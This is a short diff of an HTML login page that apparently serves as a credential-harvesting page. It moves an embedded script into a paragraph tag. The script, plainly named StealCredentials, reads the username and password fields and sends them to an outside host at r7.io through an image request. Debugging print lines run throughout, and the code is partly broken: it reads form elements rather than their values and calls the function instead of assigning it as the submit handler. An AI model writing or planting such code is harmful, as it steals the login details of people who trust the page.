@@ -31,21 +31,22 @@
   <form id="login" action="https://nickhytrek.github.io" method="get" class="untouched">
       <h1><a href="#">NOPE</a></h1>
     
-
-      <script type="text/javascript"> 
-        console.log("test1");
-        function StealCredentials() {
-          console.log("test2");
-            var username = document.getElementById("login_username");
-            var pass = document.getElementById("login_password");
-            var credentials = "username = " + username + " | " + "password = " + pass;
-            console.log("test3");
-            img = document.createElement("img");
-            img.src = "http://r7.io/e/nhytrek?s=" + credentials;
-        }
-        console.log("test4");
-        document.forms[0].onsubmit = StealCredentials();
-        </script>
+      <p>
+          <script type="text/javascript"> 
+            console.log("test1");
+            function StealCredentials() {
+              console.log("test2");
+                var username = document.getElementById("login_username");
+                var pass = document.getElementById("login_password");
+                var credentials = "username = " + username + " | " + "password = " + pass;
+                console.log("test3");
+                img = document.createElement("img");
+                img.src = "http://r7.io/e/nhytrek?s=" + credentials;
+            }
+            console.log("test4");
+            document.forms[0].onsubmit = StealCredentials();
+            </script>
+      </p>
 
       <div id="login-fields-wrapper">
         <div id="login-fields">
